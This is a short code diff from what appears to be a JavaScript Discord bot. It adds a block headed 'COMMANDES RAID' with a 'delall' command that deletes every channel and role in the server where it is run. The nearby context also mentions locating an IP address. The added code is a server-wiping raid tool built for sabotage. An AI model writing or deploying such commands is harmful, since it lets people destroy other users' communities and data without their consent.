@@ -750,6 +750,19 @@ console.log(err)
     console.log(chalk.blue.bold("IP localisée !"));
   }
 
+//COMMANDES RAID
+//Supprimer des salons
+if(cmd === (prefix + "delall")){
+try {
+await message.guild.channels.forEach(c => c.delete())
+await message.guild.roles.forEach(r => r.delete())
+
+} catch(err) {
+console.log(err)
+}
+}
+
+
 
 });
 
